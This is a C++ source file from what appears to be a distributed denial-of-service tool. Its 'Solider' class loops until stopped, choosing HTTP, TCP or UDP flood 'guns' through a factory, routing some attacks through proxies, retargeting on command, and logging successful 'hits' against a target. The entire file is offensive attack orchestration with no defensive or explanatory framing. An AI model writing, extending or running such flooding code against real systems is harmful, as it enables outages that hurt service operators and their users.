#include "solider.h"

#include "http_gun.h"
#include "tcp_gun.h"
#include "udp_gun.h"

void Solider::ExecuteOrders(const TaskController &task,
	Attackers::Target &target, SPProxyGetter proxyGetter)
{
	std::size_t hitsCount{0};

	while(!task.ShouldStop())
	{
		if(target.NeedWeaponAim())
		{
			target.Retarget(task);
		}

		Attackers::AttackMethod method = target.GetAttackMethod();
		const CURI coordinates = target.GetCoordinates();

		if(Attackers::PGun gun = GunFactory(method, task, proxyGetter))
		{
			hitsCount += gun->FireTillDead(coordinates);
		}
	}
	SPDLOG_INFO("Stoping execution with {} succesfull hits", hitsCount);
}


Attackers::PGun Solider::GunFactory(Attackers::AttackMethod attackMethod,
	const TaskController &owningTask, SPProxyGetter proxyGetter)
{
	switch(attackMethod)
	{
		case Attackers::AttackMethod::HTTPAttack:
		{
			return std::make_unique<Attackers::HTTPGun>(owningTask, proxyGetter);
		}
		case Attackers::AttackMethod::TCPAttack:
		{
			return std::make_unique<Attackers::TCPGun>(owningTask, proxyGetter);
		}
		case Attackers::AttackMethod::UDPAttack:
		{
			return std::make_unique<Attackers::UDPGun>(owningTask);
		}
		default:
		{
			SPDLOG_ERROR("Got not supported attacker");
			return nullptr;
		}
	}
}
